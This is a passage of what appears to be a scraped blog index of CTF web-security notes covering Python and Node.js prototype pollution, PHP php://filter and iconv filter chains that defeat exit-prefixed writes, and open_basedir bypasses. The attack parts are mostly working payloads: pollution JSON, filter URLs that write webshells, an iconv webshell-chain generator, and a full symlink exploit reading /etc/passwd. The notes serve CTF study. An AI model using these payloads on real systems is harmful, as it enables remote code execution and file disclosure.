\u0026#34;\\u0076\\u0061\\u0072\\u0069\\u0061\\u0062\\u006C\\u0065\\u005F\\u0073\\u0074\\u0061\\u0072\\u0074\\u005F\\u0073\\u0074\\u0072\\u0069\\u006E\\u0067\u0026#34;: \u0026#34;[#\u0026#34;, \u0026#34;\\u0076\\u0061\\u0072\\u0069\\u0061\\u0062\\u006C\\u0065\\u005F\\u0065\\u006E\\u0064\\u005F\\u0073\\u0074\\u0072\\u0069\\u006E\\u0067\u0026#34;: \u0026#34;#]\u0026#34; }, \u0026#34;config\u0026#34; : { \u0026#34;\\u0053\\u0045\\u0043\\u0052\\u0045\\u0054\\u005F\\u004B\\u0045\\u0059\u0026#34; :\u0026#34;password\u0026#34; } } } } } 然后发包伪造seesion即可\nDownUnderCTF 2024 - co2 #\r在utils中\ndef merge(src, dst): for k, v in src.items(): if hasattr(dst, \u0026#39;__getitem__\u0026#39;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) 写了一个merge\n@app.route(\u0026#34;/save_feedback\u0026#34;, methods=[\u0026#34;POST\u0026#34;]) @login_required def save_feedback(): data = json.loads(request.data) feedback = Feedback() # Because we want to dynamically grab the data and save it attributes we can merge it and it *should* create those attribs for the object. merge(data, feedback) save_feedback_to_disk(feedback) return jsonify({\u0026#34;success\u0026#34;: \u0026#34;true\u0026#34;}), 200 并且在这里进行了调用\n@app.route(\u0026#34;/get_flag\u0026#34;) @login_required def get_flag(): if flag == \u0026#34;true\u0026#34;: return \u0026#34;DUCTF{NOT_THE_REAL_FLAG}\u0026#34; else: return \u0026#34;Nope\u0026#34; 只需要污染flag的bool值即可\n{ \u0026#34;__init__\u0026#34; : { \u0026#34;__globals__\u0026#34; : { \u0026#34;flag\u0026#34; : \u0026#34;true\u0026#34; } } } 总结 #\r原型链污染挺好玩的hhh，不知道其他语言有没有这个洞嘞。\n","date":"11 July 2024","externalUrl":null,"permalink":"/posts/python-prototype-pollution/","section":"Posts","summary":"","title":"Python Prototype chains pollution","type":"posts"},{"content":"Before writing #\rBecause of procastinating, I have been for a long time to write some eassy in my blog. But rencently i decide to recover it. So i start to write it down in English.\nPrefix Content #\rWith some foundation data, we can acknowledge it more accurately.\nThe concept of Synchronous and Asynchronous #\rThe Asynchronous like when you are reading, and eating at the same time. Synchronous is you do something one by one without time overlap.\nFS in Node.js #\rso in Node.js, which have a module titled fs, have two function to use: readFileSync() and readFile().(The former is a synchronous function and the latter is an asynchronous function.)\npretending we have a file named dt.txt and the content in it is \u0026ldquo;DT you should get more exercise\u0026rdquo;。 like this and we could use those function to read the content.\nAsynchronous :\nvar fs = require(\u0026#39;fs\u0026#39;); fs.readFile(\u0026#39;dt.txt\u0026#39;,function(err,data){ if(err){ return console.error(err); } console.log(\u0026#34;Asynchronous read:\u0026#34;+data.toString()); }); Synchronous:\nvar fs = require(\u0026#39;fs\u0026#39;); var data = fs.readFileSync(\u0026#39;dt.txt\u0026#39;); console.log(\u0026#34;Synchronous read: \u0026#34; + data.toString()); The module of child_process #\rThis module give us some function to create child process.\nSynchronous : spawn exec execFile fork Asynchornous:spawnSync execSync execFileSync when we us Asychronous to create process, spawn is others basis, and when we use Synchronous to create it, we can use child_process.spwanSync()、child_process.execSync() and child_process.execFileSync()\nPrototype chain #\rtwo key word : prototype and proto\nprototype #\rIn JavaScript, the prototype object is an important mechanism for implementing object-oriented programming.It is unique to functions. It points to an object from a function. Its meaning is the prototype object of the function, that is, the prototype object of the instance created by this function (in fact, all functions can be used as constructors).\nand we can make some example\nfunction Food(bar,bar1,bar2) { this.bar = 1; this.bar1=5; } let food = new Food(); Food.prototype.bar2=6; console.log(food.bar1); console.log(food.bar2); //5 //6 as you can see, we can use property: prototype to point to this prototype function to create bar2, and we use food to inherit Food which is a class. so the food have the property : bar2 =\u0026gt; 6\nproto #\rAs we can concerned, if some class have been instantiated, you wiil not visit its prototype object by function prototype. In this case, we can use function proto to visit it\u0026rsquo;s prototype object.\nso we can do like this :\nfunction Food(bar,bar1,bar2) { this.bar = 1; this.bar1=5; } let food = new Food(); console.log(Food.prototype===food.__proto__); Prototype chain\u0026rsquo;s conception #\ruse the fromer example\nfunction Food() { this.bar = 1; this.bar1=5; } function food(){ this.bar=2; } food.prototype = new Food(); let food1 = new food(); console.log(food1.bar); console.log(food1.bar1); when we print food1.bar and food1.bar1. The Search order is like:\nfirst we search in it original class, it hava property bar=2 so it can print it like : 2 and we want to print property bar1 in it, but as we see, it not appear in its class, and we define food.prototype = new Food(), so it will search in it\u0026#39;s prototype object , so it will print : 5 and this searching structure named prototype chain.\nPrototype chain pollution #\rwe use phith0n\u0026rsquo;s example\n// foo是一个简单的JavaScript对象 let foo = {bar: 1} // foo.bar 此时为1 console.log(foo.bar) // 修改foo的原型（即Object） foo.__proto__.bar = 2 // 由于查找顺序的原因，foo.bar仍然是1 console.log(foo.bar) // 此时再用Object创建一个空的zoo对象 let zoo = {} // 查看zoo.bar console.log(zoo.bar) so there is an question: why the property in zoo.bar is 2?? When we output zoo.bar, the node.js engine starts to search in zoo. If it is not found, it searches in zoo.proto, that is, in Object. And, our foo.proto.bar = 2, is to give Object adds a bar attribute, and this attribute is inherited by zoo.This kind of modification of the prototype object of a certain object to control the operation of other objects is prototype chain pollution.\n","date":"7 July 2024","externalUrl":null,"permalink":"/posts/nodejs-prototype-pollution/","section":"Posts","summary":"","title":"Node JS Prototype chain pollution","type":"posts"},{"content":"","date":"7 July 2024","externalUrl":null,"permalink":"/tags/nodejs/","section":"Tags","summary":"","title":"Nodejs","type":"tags"},{"content":"","date":"14 April 2024","externalUrl":null,"permalink":"/tags/bashfuck/","section":"Tags","summary":"","title":"BashFuck","type":"tags"},{"content":"","date":"14 April 2024","externalUrl":null,"permalink":"/tags/bypass/","section":"Tags","summary":"","title":"Bypass","type":"tags"},{"content":"0x0e前言 #\r这个filterchain之前已经学过了，但是iconv和死亡杂糅的知识点是分开学的，而且也有一段时间了，所以打算写一篇总结起来学习可能会好一点\n0x01前置知识 #\rBase64编码与解码 #\r可能刚刚入门CTF的师傅都知道base64是什么东西，但是不知道它的工作原理。 base64编码字符表如下。 Encode Process #\r可以看见对于Sun来编码，首先就是将三个字节拆开来，再组合最后分成8bit进行编码，所以很清楚就能知道base64的编码过程就是不断拆开和组合。并且很清楚看见base64是3个字符3个字符进行编码的，当不足的时候会用=；来补齐 example:\n\u0026lt;? $data = \u0026#34;Delete\u0026#34;; echo base64_encode($data); //=\u0026gt;RGVsZXRl $data = \u0026#34;Delet\u0026#34;; echo base64_encode($data); //=\u0026gt;RGVsZXQ= ?\u0026gt; Decode Process #\r那么相反，你就会发现解码过程就是编码的逆运算，但是base64是以4个8bit的数据进行解码并且仅对有效字符进行解码，所以这个地方记住，在后面的知识点需要利用这个知识点.\n0x02死亡杂糅 #\r三种情况： file_put_contents($filename,\u0026quot;\u0026lt;?php exit();\u0026quot;.$content);\nfile_put_contents($content,\u0026quot;\u0026lt;?php exit();\u0026quot;.$content);\nfile_put_contents($filename,$content . \u0026quot;\\nxxxxxx\u0026quot;);\n第一种（文件名和参数可控） #\rbase64 #\r$filename=\u0026#39;php://filter/convert.base64decode/resource=delete.php\u0026#39;; $content = \u0026#39;aPD9waHAgcGhwaW5mbygpOw==\u0026#39;; 在前面加一个a是因为前面的解码的原因，要凑4个字符来 测试源码：\n\u0026lt;?php $filename = $_GET[\u0026#39;filename\u0026#39;]; $content = $_GET[\u0026#39;content\u0026#39;]; file_put_contents($filename,\u0026#34;\u0026lt;?php exit();\u0026#34;.$content); ?\u0026gt; 传参： http://127.0.0.1/2.php?filename=php://filter/convert.base64-decode/resource=delete.php\u0026amp;content=aPD9waHAgcGhwaW5mbygpOw== 可以发现 写入成功，如果不补齐的话就会乱码就没办法解析了 补齐之前为31个字符，补后就是32个刚好是4的倍数，所以可以解析\nrot13 #\r这里我先附上转化的脚本\n# time : 2024/1/12 # author : DELETE import string result = [] upperCase = string.ascii_uppercase lowerCase= string.ascii_lowercase upperDict={} lowerDict={} print(\u0026#34;welcome to decode rot-13!\\n\u0026#34;) inputStr=input(\u0026#34;please input what you want to decode\\n\u0026#34;) while True: print(f\u0026#34;please comfirm {inputStr} is what you want to input if yes input y if not input n\u0026#34;) flag=input(\u0026#34;请确认\u0026#34;) if(flag==\u0026#39;y\u0026#39;) or (flag ==\u0026#39;Y\u0026#39;): break if(flag==\u0026#39;n\u0026#39;) or (flag==\u0026#39;N\u0026#39;): inputStr=input(\u0026#34;please input what string you want to encode or decode!\u0026#34;) else: print(\u0026#34;comfir way is illegal\u0026#34;) break for i in range(0,len(upperCase)): if i \u0026lt; 13: upperDict[upperCase[i]]=upperCase[i+13] else: upperDict[upperCase[i]]=upperCase[i-13] for i in range(0,len(lowerCase)): if i \u0026lt; 13: lowerDict[lowerCase[i]]=lowerCase[i+13] else: lowerDict[lowerCase[i]]=lowerCase[i-13] for ch in inputStr: if ch in lowerCase: result.append(lowerDict[ch]) elif ch in upperDict: result.append(upperDict[ch]) result=\u0026#34;\u0026#34;.join(result) print(f\u0026#34;final decode result is {result}\u0026#34;) 这里构造一下编码内容后就是\u0026lt;?cuc cucvasb();?\u0026gt; 这里我们直接做playload传 可以看见也是上传了不过这里有个问题就是前面已经有一个标签了所以如果服务器开了短标签，就没办法解析了 .htaccess预包含 #\r$filename=php://filter/write=string.strip_tags/resource=.htaccess $content=?\u0026gt;php_value%20auto_prepend_file%20delete.php 注意：string.strip_tags在php7.3.0中被弃用了，所以会报错（不过好像phpstudy可以写入)并且注意下尽量在docker起环境，好像phpstudy你传就会500包含不了。 其实很简单的就能理解，其实就是做了一个文件包含，先闭合了死亡代码后面写入自定义文件 CTF中可以猜flag的路径从而完成包含，除了可以简单包含，也是可以利用伪协议或者utf-7进行包含\n组合拳 #\r这里就直接贴出来s1mple师傅的一些利用方式不做分析 1、\n$filename=\u0026#39;php://filter/string.strip_tags|convert.base64-decode/resource=s1mple.php\u0026#39; $content=\u0026#39;?\u0026gt;PD9waHAgcGhwaW5mbygpOz8+\u0026#39; 2、\n$filename=php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=s1mple.php $content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?\u0026gt;\u0026lt;?php%0dphpinfo();?\u0026gt;/resource=s1mple.php 第二种(共用一个变量) #\r首先这里放出s1ample师傅的一种打法 在php不为7的条件下\n?content=php://filter/write=string.strip_tags/?\u0026gt;php_value%20auto_prepend_file%20G:\\s1mple.php%0a%23/resource=.htaccess 其实也就是写入.htaccess进行预包含和前面的原理是一样的\n关于直接使用Base64的思考 #\r在这个知识点上，很多师傅都没有成功。 比如Cyc1e师傅写的\nphp//filter/write=convertbase64decodePD9waHAgcGhwaW5mbygpOz8+/resource=Cyc1e.php s1maple师傅写的：\nphp://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php 问题就在于base64在解码的时候将=作为了解码末尾的判断，如果出现的话后面的字符就无法被解码也就无法构成需要的代码。 于是我去翻了一下php中关于base64解码的部分函数的代码如下\nstatic zend_always_inline int php_base64_decode_impl(const unsigned char *in, size_t inl, unsigned char *out, size_t *outl, bool strict) /* {{{ */ { int ch; size_t i = 0, padding = 0, j = *outl; #if defined(__aarch64__) || defined(_M_ARM64) if (inl \u0026gt;= 16 * 4) { size_t left = 0; j += neon_base64_decode(in, inl, out, \u0026amp;left); i = inl - left; in += i; inl = left; } #endif /* run through the whole string, converting as we go */ while (inl-- \u0026gt; 0) { ch = *in++; if (ch == base64_pad) { padding++; continue; } ch = base64_reverse_table[ch]; if (!strict) { /* skip unknown characters and whitespace */ if (ch \u0026lt; 0) { continue; } } else { /* skip whitespace */ if (ch == -1) { continue; } /* fail on bad characters or if any data follows padding */ if (ch == -2 || padding) { goto fail; } } switch (i % 4) { case 0: out[j] = ch \u0026lt;\u0026lt; 2; break; case 1: out[j++] |= ch \u0026gt;\u0026gt; 4; out[j] = (ch \u0026amp; 0x0f) \u0026lt;\u0026lt; 4; break; case 2: out[j++] |= ch \u0026gt;\u0026gt;2; out[j] = (ch \u0026amp; 0x03) \u0026lt;\u0026lt; 6; break; case 3: out[j++] |= ch; break; } i++; } /* fail if the input is truncated (only one char in last group) */ if (strict \u0026amp;\u0026amp; i % 4 == 1) { goto fail; } /* fail if the padding length is wrong (not VV==, VVV=), but accept zero padding * RFC 4648: \u0026#34;In some circumstances, the use of padding [--] is not required\u0026#34; */ if (strict \u0026amp;\u0026amp; padding \u0026amp;\u0026amp; (padding \u0026gt; 2 || (i + padding) % 4 != 0)) { goto fail; } *outl = j; out[j] = \u0026#39;\\0\u0026#39;; return 1; fail: return 0; } 注意到if (!strict)这个判断，也就是在严格模式下他就会对未知字符和空白字符进行跳过，然后这个地方我也去用gpt辅助了一下，可以在php环境变量之中将其改为非严格模式就可以对=号的内容继续解码，所以我就去起了一个docker，但是还是打不通，文件可以生成但是没办法写入内容就很奇怪，（所以在这里还是断了）。\n去掉等号之过滤器嵌套base64 #\r这里S1maple师傅的playload：php://filter/write=string.strip_tags|convert.base64-decode/resource=?\u0026gt;PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php 这里利用了伪目录的方法让他生成正常的文件名 另类base64 #\rplayload:\nphp://filter/\u0026lt;?|string.strip_tags|convert.base64-decode/resource=?\u0026gt;PD9waHAgcGhwaW5mbygpOz8%2B/../delete.php 这里的思路就是将=号写到php的标识符中进行过滤掉然后再进行转码再分解死亡代码\nrot13 #\r这个相对于base64就不是利用特性绕过，所以相对于好用一些\nphp://filter/write=string.rot13|\u0026lt;?cuc cucvasb();?\u0026gt;|/resource=delete.php 0x03iconv转换 #\r因为这个知识点Zedd师傅单独写了一篇文章，所以我觉得这里不仅可以绕死亡代码也可以用于文件包含当中，于是我将其作为单独的一个知识点分出，但是还是可以绕过第二类的死亡代码的 #本质上也和base64的特性有挂钩，也是不断的去编码解码来获取我们想要的东西 这里我就拿Zedd师傅其中的一段我认为比较有代表性的代码块贴出来\n\u0026lt;?php $base64_payload = \u0026#34;PD89YCRfR0VUWzBdYDs7Pz4\u0026#34;; $conversions = array( \u0026#39;R\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2\u0026#39;, \u0026#39;B\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2\u0026#39;, \u0026#39;C\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR\u0026#39;, \u0026#39;8\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2\u0026#39;, \u0026#39;9\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB\u0026#39;, \u0026#39;f\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213\u0026#39;, \u0026#39;s\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61\u0026#39;, \u0026#39;z\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS\u0026#39;, \u0026#39;U\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932\u0026#39;, \u0026#39;P\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213\u0026#39;, \u0026#39;V\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5\u0026#39;, \u0026#39;0\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2\u0026#39;, \u0026#39;Y\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2\u0026#39;, \u0026#39;W\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2\u0026#39;, \u0026#39;d\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2\u0026#39;, \u0026#39;D\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2\u0026#39;, \u0026#39;7\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2\u0026#39;, \u0026#39;4\u0026#39; =\u0026gt; \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2\u0026#39; ); $filters = \u0026#34;convert.base64-encode|\u0026#34;; # make sure to get rid of any equal signs in both the string we just generated and the rest of the file $filters .= \u0026#34;convert.iconv.UTF8.UTF7|\u0026#34;; foreach (str_split(strrev($base64_payload)) as $c) { $filters .= $conversions[$c] . \u0026#34;|\u0026#34;; $filters .= \u0026#34;convert.base64-decode|\u0026#34;; $filters .= \u0026#34;convert.base64-encode|\u0026#34;; $filters .= \u0026#34;convert.iconv.UTF8.UTF7|\u0026#34;; } $filters .= \u0026#34;convert.base64-decode\u0026#34;; $final_payload = \u0026#34;php://filter/{$filters}/resource=data://,aaaaaaaaaaaaaaaaaaaa\u0026#34;; // echo $final_payload; var_dump(file_get_contents($final_payload)); // hexdump // 00000000 73 74 72 69 6e 67 28 31 38 29 20 22 3c 3f 3d 60 |string(18) \u0026#34;\u0026lt;?=`| // 00000010 24 5f 47 45 54 5b 30 5d 60 3b 3b 3f 3e 18 22 0a |$_GET[0]`;;?\u0026gt;.\u0026#34;.| 可以看到这里不断的利用编码和转码进行转化利用base64的宽松性来构造出马子 剩下的那些题目就自己去看吧hhh 当然有些师傅有头疼，那我怎么知道经过什么转化能变成我要的东西呀，这里贴一个传送门hh，一个fuzz的代码 https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT tql wupco师傅\n第三种类型 #\rfile_put_contents($filename,$content . \u0026quot;\\nxxxxxx\u0026quot;); 这里也就比较简单，其实就是对后面的杂糅内容进行注释，但是题目肯定会做限制，所以也有其他方法，也是可以利用写入.htaccess文件进行预包含将后面的杂糅语句注释掉即可\n(好累啊好累啊这里最后一个知识点直接贴大B哥的)\n0x04php://temp #\r在这里插入一条知识点，就是temp和memory伪协议：\nphp://memory 和 php://temp 是一个类似文件 包装器的数据流，允许读写临时数据。 两者的唯一区别是 php://memory 总是把数据储存在内存中， 而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。 临时文件位置的决定和 sys_get_temp_dir() 的方式一致\nphp://temp 的内存限制可通过添加 /maxmemory:NN 来控制，NN 是以字节为单位、保留在内存的最大数据量，超过则使用临时文件\n$fiveMBs = 5 * 1024 * 1024; $fp = fopen(\u0026#34;php://temp/maxmemory:$fiveMBs\u0026#34;, \u0026#39;r+\u0026#39;); fputs($fp, \u0026#34;hello\\n\u0026#34;); // 读取写入的数据. rewind($fp); echo stream_get_contents($fp); php://memory 和 php://temp 是一次性的，比如：stream 流关闭后，就无法再次得到以前的内容了\nfile_put_contents(\u0026#39;php://memory\u0026#39;, \u0026#39;PHP\u0026#39;); echo file_get_contents(\u0026#39;php://memory\u0026#39;); // 啥也没有 参考文章： 1、 https://boogipop.com/2023/03/02/FilterChain%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/#Filterchain%E6%9E%84%E9%80%A0%EF%BC%88%E5%8E%9F%E7%90%86%E9%98%90%E8%BF%B0%EF%BC%89 2、 https://xz.aliyun.com/t/8163?time__1311=n4%2BxuDgDBDyGKAKD%3DD7Dl1oQST4j2DiKErYx\u0026alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-6 3、 https://tttang.com/archive/1395/\n","date":"14 April 2024","externalUrl":null,"permalink":"/posts/filter-chain/","section":"Posts","summary":"","title":"Filter Chain learning","type":"posts"},{"content":"","date":"14 April 2024","externalUrl":null,"permalink":"/tags/hash/","section":"Tags","summary":"","title":"Hash","type":"tags"},{"content":"","date":"14 April 2024","externalUrl":null,"permalink":"/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":"前言 #\remm最近刷题呢，之前都没有系统刷过题目所以有些知识点就没有学习，现在就来一点点补上，还是太菜了\nintroduction #\rOpen_basedir是PHP设置中为了防御PHP跨目录进行文件（目录）读写的方法，所有PHP中有关文件读、写的函数都会经过open_basedir的检查。Open_basedir实际上是一些目录的集合，在定义了open_basedir以后，php可以读写的文件、目录都将被限制在这些目录中。\n设置open_basedir的方法，在linux下，不同的目录由“:”分割，如“/var/www/:/tmp/”；在Windows下不同目录由“;”分割，如“c:/www;c:/windows/temp”。 可以在php.ini配置文件中进行配置\nglobe://伪协议 #\r那么在使用这个协议之前那肯定得知道这个协议是什么吧，所以也是去看了一下php的doc https://www.php.net/manual/zh/wrappers.glob.php\nSimple Globe:// #\r可以看见官方给出的demo\n\u0026lt;?php // 循环 ext/spl/examples/ 目录里所有 *.php 文件 // 并打印文件名和文件尺寸 $it = new DirectoryIterator(\u0026#34;glob://ext/spl/examples/*.php\u0026#34;); foreach($it as $f) { printf(\u0026#34;%s: %.1FK\\n\u0026#34;, $f-\u0026gt;getFilename(), $f-\u0026gt;getSize()/1024); } ?\u0026gt; 这个只做一个引入，因为单纯的使用globe伪协议是没有办法绕过的，并且不能列出前面的目录以及以外的文件，更不能读取文件内容所以单纯的使用并没有什么好玩的\nDiretorylterator + Globe:// #\r关于Diretorylterator这个类的一些介绍： https://www.php.net/manual/zh/class.directoryiterator.php php5中增加的一个类，为用户提供一个简单的查看目录的接口 demo2:\n$result = array{}; $mulu =new Diretorylterator(\u0026#34;globle:///*\u0026#34;); foreach($mulu as $a){ $result = $a-\u0026gt;__toString(); } sort($result); foreach($result as $s){ echo \u0026#34;{$s}\u0026lt;br/\u0026gt;\u0026#34;; } 这里自己打了一遍，因为不想贴别人的代码\u0026hellip;（主要是自己打一遍比较好）,绕过条件：PHP\u0026gt;5.3 \u0026amp;\u0026amp; Linux环境下才可\nopendir()+readdir()+glob:// #\ropendir()\u0026ndash;\u0026gt;打开目录 readdir()-\u0026gt;返回目录中下一个文件的文件名。文件名以在文件系统中的排序返回。 所以脚本如下\n\u0026lt;?php $a = $_GET[\u0026#39;c\u0026#39;]; if ( $b = opendir($a) ) { while ( ($file = readdir($b)) !== false ) { echo $file.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } closedir($b); } ?\u0026gt; scandir()+glob:// #\r关于这个解法我不打算去看因为这个也是好像绕不了open_basedir的 引用：“这种方法也只能列出根目录和open_basedir允许目录下的文件。“\nsymlink绕过 #\rsymlink()函数创建一个从指定名称连接的现存目标文件开始的符号连接。： https://www.php.net/manual/zh/function.symlink.php 用法： symlink(string $target, string $link): bool\n\u0026lt;?php mkdir(\u0026#34;A\u0026#34;); chdir(\u0026#34;A\u0026#34;); mkdir(\u0026#34;B\u0026#34;); chdir(\u0026#34;B\u0026#34;); mkdir(\u0026#34;C\u0026#34;); chdir(\u0026#34;C\u0026#34;); mkdir(\u0026#34;D\u0026#34;); chdir(\u0026#34;D\u0026#34;); chdir(\u0026#34;..\u0026#34;); chdir(\u0026#34;..\u0026#34;); chdir(\u0026#34;..\u0026#34;); chdir(\u0026#34;..\u0026#34;); symlink(\u0026#34;A/B/C/D\u0026#34;,\u0026#34;SD\u0026#34;); symlink(\u0026#34;SD/../../../../etc/passwd\u0026#34;,\u0026#34;POC\u0026#34;); unlink(\u0026#34;SD\u0026#34;); mkdir(\u0026#34;SD\u0026#34;); ?\u0026gt; 这里的原理就是通过软连接作为一个桥梁来进行绕过 具体的思路如下：\n创建了A/B/C/D这个目录 创建SD软链接到目录A/B/C/D 然后让POC指向SD上面的目录这个时候因为返回后../../../../刚好回到open_basedir限制的html目录下面所以这里没毛病 然后删除了SD软链接又创建了一个文件夹这个时候POC指向的就是: var/www/html/SD/../../../../etc/passwd从而进行绕过（这个思路确实好玩） exp哈哈哈哈哈哈哈哈哈也是贴贴 \u0026lt;?php /* * by phithon * From https://www.leavesongs.com * detail: http://cxsecurity.com/issue/WLB-2009110068 */ header(\u0026#39;content-type: text/plain\u0026#39;); error_reporting(-1); ini_set(\u0026#39;display_errors\u0026#39;, TRUE); printf(\u0026#34;open_basedir: %s\\nphp_version: %s\\n\u0026#34;, ini_get(\u0026#39;open_basedir\u0026#39;), phpversion()); printf(\u0026#34;disable_functions: %s\\n\u0026#34;, ini_get(\u0026#39;disable_functions\u0026#39;)); $file = str_replace(\u0026#39;\\\\\u0026#39;, \u0026#39;/\u0026#39;, isset($_REQUEST[\u0026#39;file\u0026#39;]) ? $_REQUEST[\u0026#39;file\u0026#39;] : \u0026#39;/etc/passwd\u0026#39;); $relat_file = getRelativePath(__FILE__, $file); $paths = explode(\u0026#39;/\u0026#39;, $file); $name = mt_rand() % 999; $exp = getRandStr(); mkdir($name); chdir($name); for($i = 1 ; $i \u0026lt; count($paths) - 1 ; $i++){ mkdir($paths[$i]); chdir($paths[$i]); } mkdir($paths[$i]); for ($i -= 1; $i \u0026gt; 0; $i--) { chdir(\u0026#39;..\u0026#39;); } $paths = explode(\u0026#39;/\u0026#39;, $relat_file); $j = 0; for ($i = 0; $paths[$i] == \u0026#39;..\u0026#39;; $i++) { mkdir($name); chdir($name); $j++; } for ($i = 0; $i \u0026lt;= $j; $i++) { chdir(\u0026#39;..\u0026#39;); } $tmp = array_fill(0, $j + 1, $name); symlink(implode(\u0026#39;/\u0026#39;, $tmp), \u0026#39;tmplink\u0026#39;); $tmp = array_fill(0, $j, \u0026#39;..\u0026#39;); symlink(\u0026#39;tmplink/\u0026#39; . implode(\u0026#39;/\u0026#39;, $tmp) . $file, $exp); unlink(\u0026#39;tmplink\u0026#39;); mkdir(\u0026#39;tmplink\u0026#39;); delfile($name); $exp = dirname($_SERVER[\u0026#39;SCRIPT_NAME\u0026#39;]) . \u0026#34;/{$exp}\u0026#34;; $exp = \u0026#34;http://{$_SERVER[\u0026#39;SERVER_NAME\u0026#39;]}{$exp}\u0026#34;; echo \u0026#34;\\n-----------------content---------------\\n\\n\u0026#34;; echo file_get_contents($exp); delfile(\u0026#39;tmplink\u0026#39;); function getRelativePath($from, $to) { // some compatibility fixes for Windows paths $from = rtrim($from, \u0026#39;\\/\u0026#39;) . \u0026#39;/\u0026#39;; $from = str_replace(\u0026#39;\\\\\u0026#39;, \u0026#39;/\u0026#39;, $from); $to = str_replace(\u0026#39;\\\\\u0026#39;, \u0026#39;/\u0026#39;, $to); $from = explode(\u0026#39;/\u0026#39;, $from); $to = explode(\u0026#39;/\u0026#39;, $to); $relPath = $to; foreach($from as $depth =\u0026gt; $dir) { // find first non-matching dir if($dir === $to[$depth]) { // ignore this directory array_shift($relPath); } else { // get number of remaining dirs to $from $remaining = count($from) - $depth; if($remaining \u0026gt; 1) { // add traversals up to first matching dir $padLength = (count($relPath) + $remaining - 1) * -1; $relPath = array_pad($relPath, $padLength, \u0026#39;..\u0026#39;); break; } else { $relPath[0] = \u0026#39;./\u0026#39; . $relPath[0]; } } } return implode(\u0026#39;/\u0026#39;, $relPath); } function delfile($deldir){ if (@is_file($deldir)) { @chmod($deldir,0777); return @unlink($deldir); }else if(@is_dir($deldir)){ if(($mydir = @opendir($deldir)) == NULL) return false; while(false !== ($file = @readdir($mydir))) { $name = File_Str($deldir.\u0026#39;/\u0026#39;.$file); if(($file!=\u0026#39;.\u0026#39;) \u0026amp;\u0026amp; ($file!=\u0026#39;..\u0026#39;)){delfile($name);} } @closedir($mydir); @chmod($deldir,0777); return @rmdir($deldir) ? true : false; } } function File_Str($string) { return str_replace(\u0026#39;//\u0026#39;,\u0026#39;/\u0026#39;,str_replace(\u0026#39;\\\\\u0026#39;,\u0026#39;/\u0026#39;,$string)); } function getRandStr($length = 6) { $chars = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39;; $randStr = \u0026#39;\u0026#39;; for ($i = 0; $i \u0026lt; $length; $i++) { $randStr .= substr($chars, mt_rand(0, strlen($chars) - 1), 1); } return $randStr; } realpath列举目录 